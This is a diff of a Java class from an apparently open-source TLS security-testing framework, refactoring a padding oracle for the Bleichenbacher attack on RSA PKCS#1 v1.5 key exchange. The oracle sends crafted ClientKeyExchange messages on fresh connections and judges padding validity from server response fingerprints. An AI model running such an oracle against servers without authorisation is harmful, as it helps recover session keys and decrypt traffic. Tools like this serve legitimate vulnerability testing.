@@ -8,102 +8,95 @@
  */
 package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;
 
-import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
-import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
+import de.rub.nds.tlsattacker.attacks.config.AttackConfig;
+import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
+import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowType;
+import de.rub.nds.tlsattacker.attacks.util.response.EqualityError;
+import de.rub.nds.tlsattacker.attacks.util.response.FingerPrintChecker;
+import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
+import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
-import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
-import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
 import de.rub.nds.tlsattacker.core.state.State;
-import de.rub.nds.tlsattacker.core.state.TlsContext;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
-import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
-import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
-import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
+import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.util.MathHelper;
+import java.io.IOException;
 import java.security.PublicKey;
 import java.security.interfaces.RSAPublicKey;
-import java.util.LinkedList;
-import java.util.List;
-import org.apache.logging.log4j.Level;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.core.LoggerContext;
-import org.apache.logging.log4j.core.config.Configuration;
-import org.apache.logging.log4j.core.config.LoggerConfig;
 
-/**
- *
- * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
- */
 public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {
 
-    Config config;
+    private final AttackConfig attackConfig;
 
-    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, Config config) {
+    private final ResponseFingerprint validResponseContent;
+
+    private final ResponseFingerprint invalidResponseContent;
+
+    private final BleichenbacherWorkflowType type;
+
+    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, AttackConfig config,
+            ResponseFingerprint validResponseContent, ResponseFingerprint invalidResponseContent,
+            BleichenbacherWorkflowType type) {
         this.publicKey = (RSAPublicKey) pubKey;
         this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
-        this.config = config;
-        this.config.setWorkflowTraceType(WorkflowTraceType.HELLO);
-
-        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
-        Configuration ctxConfig = ctx.getConfiguration();
-        LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
-        loggerConfig.setLevel(Level.INFO);
-        ctx.updateLoggers();
+        this.attackConfig = config;
+        this.validResponseContent = validResponseContent;
+        this.invalidResponseContent = invalidResponseContent;
+        this.type = type;
     }
 
     @Override
     public boolean checkPKCSConformity(final byte[] msg) {
+        // we are initializing a new connection in every loop step, since most
+        // of the known servers close the connection after an invalid handshake
+        Config tlsConfig = attackConfig.createConfig();
+        tlsConfig.setWorkflowExecutorShouldClose(false);
+        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, msg);
+        State state = new State(tlsConfig, trace);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
+                .getWorkflowExecutorType(), state);
 
-        State state = new State(config);
-        TlsContext tlsContext = state.getTlsContext();
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
-                config.getWorkflowExecutorType(), state);
-
-        List<ProtocolMessage> protocolMessages = new LinkedList<>();
-        protocolMessages.add(new ServerHelloMessage(config));
-        protocolMessages.add(new CertificateMessage(config));
-        protocolMessages.add(new ServerHelloDoneMessage(config));
-        state.getWorkflowTrace().addTlsAction(new ReceiveAction(protocolMessages));
-        protocolMessages = new LinkedList<>();
-        RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage(config);
-        protocolMessages.add(cke);
-        protocolMessages.add(new ChangeCipherSpecMessage(config));
-        state.getWorkflowTrace().addTlsAction(new SendAction(protocolMessages));
-
-        protocolMessages = new LinkedList<>();
-        protocolMessages.add(new AlertMessage(config));
-        state.getWorkflowTrace().addTlsAction(new ReceiveAction(protocolMessages));
-
-        ModifiableByteArray pms = new ModifiableByteArray();
-        pms.setModification(ByteArrayModificationFactory.explicitValue(msg));
-        cke.setPublicKey(pms);
-
-        if (numberOfQueries % 100 == 0) {
-            LOGGER.debug("Number of queries so far: {}", numberOfQueries);
+        numberOfQueries++;
+        if (numberOfQueries % 1000 == 0) {
+            LOGGER.info("Number of queries so far: {}", numberOfQueries);
         }
 
-        boolean valid = true;
+        Boolean conform = false;
         try {
             workflowExecutor.executeWorkflow();
-        } catch (WorkflowExecutionException e) {
-            // TODO implementing the orcale through caught exceptions is not
-            // smart
-            valid = false;
-            e.printStackTrace();
-        } finally {
-            numberOfQueries++;
-        }
-        if (tlsContext.isReceivedFatalAlert()) {
-            valid = false;
-        }
+            ResponseFingerprint fingerprint = getFingerprint(state);
+            clearConnections(state);
+            if (fingerprint != null) {
+                if (validResponseContent != null) {
+                    conform = FingerPrintChecker.checkEquality(fingerprint, validResponseContent, true) == EqualityError.NONE;
+                } else if (invalidResponseContent != null) {
+                    conform = FingerPrintChecker.checkEquality(fingerprint, invalidResponseContent, true) != EqualityError.NONE;
+                }
+            }
 
-        return valid;
+        } catch (WorkflowExecutionException e) {
+            LOGGER.debug(e.getLocalizedMessage(), e);
+        }
+        return conform;
+    }
+
+    private ResponseFingerprint getFingerprint(State state) {
+        if (state.getWorkflowTrace().allActionsExecuted()) {
+            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(state);
+            return fingerprint;
+        } else {
+            LOGGER.debug("Could not execute Workflow. Something went wrong... Check the debug output for more information");
+        }
+        return null;
+    }
+
+    private void clearConnections(State state) {
+        try {
+            state.getTlsContext().getTransportHandler().closeConnection();
+        } catch (IOException ex) {
+            LOGGER.debug(ex);
+        }
     }
 }
